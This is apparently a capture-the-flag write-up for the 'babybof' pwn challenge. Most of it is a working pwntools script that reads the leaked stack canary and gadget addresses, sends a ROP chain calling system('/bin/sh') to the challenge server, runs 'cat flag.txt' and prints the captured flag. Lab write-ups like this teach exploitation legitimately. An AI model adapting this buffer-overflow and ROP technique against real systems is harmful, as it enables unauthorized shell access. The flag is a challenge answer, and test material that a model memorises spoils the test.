**Type:** Pwn  
**Level:** 1/3  
**Author:** Eth007  
**Solved by:** LUZ1LF3R

**Description:**  
welcome to pwn! hopefully you can do your first buffer overflow

**Files:** vuln

**Plan:**  
From the challenge description, this challenge looks lika a simple buffer overflow chall. Performing buffer overflow shall give us the flag

**Notes:**  
I crafted a Return-Oriented Programming (ROP) exploit for a stack-based buffer overflow challenge as after testing the binary I found that it is protecting the stack canary. So the script bypasses the stack canary protection and executes `system("/bin/sh")` to get a shell. Here is the python script:

```python
#!/usr/bin/env python3
from pwn import *
from time import sleep

# Target
HOST, PORT = "babybof.chal.imaginaryctf.org", 1337

def find_exact_offset():
    """
    Probe different offsets to identify where the stack canary sits.
    Uses a marker to detect if/when we overwrite it.
    """
    print("Finding exact canary offset...")
    for offset in range(40, 60, 8):
        try:
            p = remote(HOST, PORT)
            output = p.recvuntil(b"enter your input").decode()

            # Parse canary
            canary = None
            for line in output.splitlines():
                if "canary:" in line:
                    canary = int(line.split(":")[1].strip(), 16)
                    break
            if not canary:
                p.close()
                continue

            # Build test payload
            test_payload = b"A" * offset + b"TESTMARK"
            p.sendline(test_payload)
            response = p.recvall(timeout=2).decode()

            print(f"Offset {offset}: Original canary = 0x{canary:x}")
            if f"canary: 0x{canary:x}" in response:
                print(f"  ✓ Canary preserved at {offset}")
            elif "canary: 0x4b52414d54534554" in response:  # "TESTMARK"
                print(f"  ⚠ Canary overwritten at {offset}")
            else:
                corrupted = [l for l in response.splitlines() if "canary:" in l]
                if corrupted:
                    print(f"  ✗ Canary corrupted: {corrupted[0]}")

            p.close()
        except Exception as e:
            print(f"Error at {offset}: {e}")
            continue

def exploit():
    """
    Build a ROP chain to call system("/bin/sh").
    Payload layout:
      [56 buffer] + [canary] + [rbp] + [ROP chain]
    """
    p = remote(HOST, PORT)
    output = p.recvuntil(b"enter your input").decode()

    # Parse leaked values
    system_addr = pop_rdi_ret = ret_addr = binsh_addr = canary = None
    for line in output.splitlines():
        if "system @" in line:
            system_addr = int(line.split("@")[1].strip(), 16)
        elif "pop rdi; ret @" in line:
            pop_rdi_ret = int(line.split("@")[1].strip(), 16)
        elif "ret @" in line:
            ret_addr = int(line.split("@")[1].strip(), 16)
        elif '"/bin/sh" @' in line:
            binsh_addr = int(line.split("@")[1].strip(), 16)
        elif "canary:" in line:
            canary = int(line.split(":")[1].strip(), 16)

    print(f"system: 0x{system_addr:x}")
    print(f"canary: 0x{canary:x}")

    # Construct payload
    payload  = b"A" * 56
    payload += p64(canary)
    payload += b"B" * 8             # saved rbp
    payload += p64(ret_addr)        # stack alignment
    payload += p64(pop_rdi_ret)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    print(f"Payload length = {len(payload)} bytes")

    p.sendline(payload)
    sleep(1)

    # Basic shell test
    p.sendline(b"whoami")
    resp = p.recv(timeout=2)
    print(f"whoami → {resp}")

    # Try to grab flag
    p.sendline(b"cat flag.txt")
    flag = p.recv(timeout=2)
    print(f"Flag attempt: {flag}")
    if b"ictf{" in flag:
        print(f"\n🚩 FLAG FOUND: {flag.decode()} 🚩\n")

    p.interactive()

def main():
    context.arch = "amd64"
    context.log_level = "info"
    print("=== BABYBOF ===")

    find_exact_offset()
    print("\n=== EXPLOITING ===")
    exploit()

if __name__ == "__main__":
    main()
```

**Breakdown:**

1. The binary allows buffer overflow but protects the stack canary by assigning a value.
2. Crafted a script that:
   - Finds the exact canary offset by testing payloads.
   - Crafts a ROP chain to call system("/bin/sh").
   - Pops a shell and grabs the flag.

**Outcome:**
Successfully exploited the binary and the remote server using buffer overflow.

**Flag:**
`ictf{arent_challenges_written_two_hours_before_ctf_amazing}`
